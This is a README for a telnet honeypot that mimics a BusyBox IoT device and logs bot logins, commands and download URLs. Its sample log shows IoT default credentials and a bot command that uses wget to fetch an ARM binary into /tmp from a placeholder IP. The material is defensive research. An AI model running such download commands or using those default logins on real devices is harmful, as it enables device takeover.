# honeypot

A telnet honeypot: a fake BusyBox IoT device that lets bots log in and
records what they try (credentials, commands, download URLs, the bytes
they `echo` into files). It is meant to run for weeks against hostile
traffic, as a stress test of Gem's runtime; `PLAN.md` has the whole plan
and which phases are done.

## Run it

```sh
build/gem examples/honeypot/main.gem                     # 127.0.0.1:2323, data in ./honeypot_data
build/gem examples/honeypot/main.gem --port 2323 --bind 0.0.0.0 --data DIR --keep-weeks 8
build/gem examples/honeypot/main.gem --log               # also print each event on stdout
build/gem examples/honeypot/test.gem                     # the tests (part of make test)
```

```sh
telnet 127.0.0.1 2323        # or nc 127.0.0.1 2323, which skips negotiation as most bots do
```

Events go to a sqlite database, one file per week in the data directory
(`honeypot-2026-10-05.db`, after the week's Monday, UTC), made if
missing (its parent must exist); files past the newest `--keep-weeks` are
deleted when the recorder starts and at its first write in a new week. Read them
with the `sqlite3` command-line shell (from SQLite, not part of this
repository):

```sh
sqlite3 honeypot_data/honeypot-2026-10-05.db \
  "SELECT username, password, count(*) FROM logins GROUP BY 1, 2 ORDER BY 3 DESC LIMIT 20"
```

Every stored string is attacker-controlled: escape it before showing it
in a terminal or a browser.

With `--log`, each event but the raw input is also a line on stdout, with
every byte outside printable ASCII written as `\xHH`. A session is named
by its pid:

```
2026-10-10T09:34:31Z session=6 session_start ip="127.0.0.1" port=63532
2026-10-10T09:34:31Z session=6 login user="root" password="xc3511" ok=false
2026-10-10T09:34:31Z session=6 login user="root" password="root" ok=false
2026-10-10T09:34:31Z session=6 login user="root" password="vizxv" ok=true
2026-10-10T09:34:31Z session=6 command line="cd /tmp; wget http://1.2.3.4/x.arm7; echo -e \"\\x45LF\""
2026-10-10T09:34:31Z session=6 url url="http://1.2.3.4/x.arm7" via="wget"
2026-10-10T09:34:31Z session=6 echo bytes="ELF"
2026-10-10T09:34:31Z session=6 command line="exit"
2026-10-10T09:34:31Z session=6 session_end reason="exit" bytes_in=100 bytes_out=403 logged_in=true ms=1
```

| Event | Fields | Stored in |
|---|---|---|
| `session_start` | `ip`, `port` | a `sessions` row |
| `input` | `bytes`, a chunk as read, the first 64 KB of a session | `input` (BLOB) |
| `login` | `user`, `password`, `ok` | `logins` |
| `command` | `line`, as typed | `commands` |
| `url` | `url`, `via` (`wget`, `curl`, `tftp`, `ftpget`) | `urls` |
| `echo` | `bytes`, what an `echo -e` decoded | `echoes` (BLOB) |
| `cap` | `cap`: `line_too_long`, `subneg_too_long`, `input_truncated`; or `spawn_failed` with `ip` and `detail`, when no process could be spawned for a connection | `cap_events` |
| `error` | `reason`, `trace`, and the `session_end` counts: the session raised, and crashes next | the crash's `trace` and the session's counts |
| `session_end` | `reason` (`closed`, `idle`, `exit`, `write_failed`), `bytes_in`, `bytes_out`, `logged_in`, `ms` | ends the `sessions` row |
| `crash` | `reason`: the session exited abnormally (an error, or a kill) | `crashes`; ends the row as `crash` |

A session whose end never reached the recorder (the recorder or the
registry restarted meanwhile) is ended within two minutes of its death:
as `crash` when its `error` event reached the recorder, else as `lost`.
A session live when a new week starts has its row in the old file ended
as `week_end` and gets a new row in the new file. When the recorder
starts, it ends the rows a previous run of the program left open as
`lost`. The schema is
`SCHEMA` in `recorder.gem`; times are epoch milliseconds.

## Design

```
honeypot_sup (supervisor, one_for_one)
├── recorder            ── stores the events in sqlite
└── front (supervisor, one_for_all)
    ├── registry        ── spawns and monitors the sessions
    │                       └── per connection: a session
    └── acceptor        ── tcp_accept loop
```

| File | What it holds |
|---|---|
| `main.gem` | entry point: flags, listen, start |
| `server.gem` | the supervision tree and the accept loop |
| `registry.gem` | starts a session per connection, reports crashes |
| `session.gem` | one connection: reads, echo, writes, timeouts |
| `telnet.gem` | strips telnet commands from the input, answers negotiation |
| `lines.gem` | splits the input into lines |
| `shell.gem` | the fake login and shell, as a state machine that does no I/O |
| `device.gem` | the fake device's canned text |
| `recorder.gem` | the database: schema, batched writes, weekly files; the log lines |
| `test.gem` | unit tests and end-to-end tests over TCP |

Choices worth knowing:

- **Nothing is ever run or fetched.** `wget`, `curl`, `tftp` and
  `ftpget` record the URL; `wget` and `curl` print fake progress, and
  running a downloaded file prints nothing.
- **The shell does no I/O.** `shell.line` takes a line and returns the
  text to send and the events, so the tests drive it without sockets.
- **Negotiation answers each request at most once.** The server offers `WILL
  ECHO` and `WILL SUPPRESS-GO-AHEAD`, accepts the client's
  SUPPRESS-GO-AHEAD, refuses every other option, and never
  answers the same request twice, so a client that keeps asking can't
  make it loop. It echoes only for a client that accepted the echo, line
  by line, so a password that arrives in the same packet as its username
  isn't echoed.
- **A session's input buffers have caps.** A line over 4 KB is dropped
  from the line buffer, and a subnegotiation over 1 KB is abandoned, its
  rest read as ordinary input; both are logged. Their bytes are still in
  the stored input, within its 64 KB.
- **Crashes aren't hidden, and keep their data.** A session sends its
  raw input to the recorder as it reads it, before handling it, so the
  bytes that crash a session are stored. It runs under one `pcall` only
  to send the error's trace to the recorder, then raises the same error
  again: it still crashes, its `DOWN` carries the reason, and the stderr
  report shows that last raise. A session that is killed has no trace.
- **The recorder writes in batches.** It is the only process that
  touches sqlite, whose queries run on the scheduler thread: it stores the
  events it gets in one transaction every second, or every 200 events.
  A crash of the whole program loses about the last second of events,
  the input included.
- **Each session claims its socket**, so it closes however the session
  ends. The registry claims it before that; a socket still waiting in the
  registry's mailbox belongs to the acceptor, so the registry and the
  acceptor restart together, and a registry crash closes those too.

## Known limits

- **No limits yet on sessions per IP, session length, bytes or
  commands** (phase 5). Only the idle timeout (60 s) and the write
  timeout (5 s) end a session early. The recorder's mailbox has no cap
  yet (phase 5).
- **Only the first 64 KB of a session's input are stored**, so a crash
  after that keeps the start of the input, not the bytes that caused it.
- **Commands are split roughly.** `$VAR` and globs are kept as typed. A
  command substitution (`$(...)`, backquotes) runs, but all of a line's
  run before its commands, whatever `&&` and `||` decide, and its output
  isn't split into words. `(...)` and `{ ...; }` groups aren't parsed. In
  a pipeline, filters like `grep` and `head` pass their input through
  unchanged.
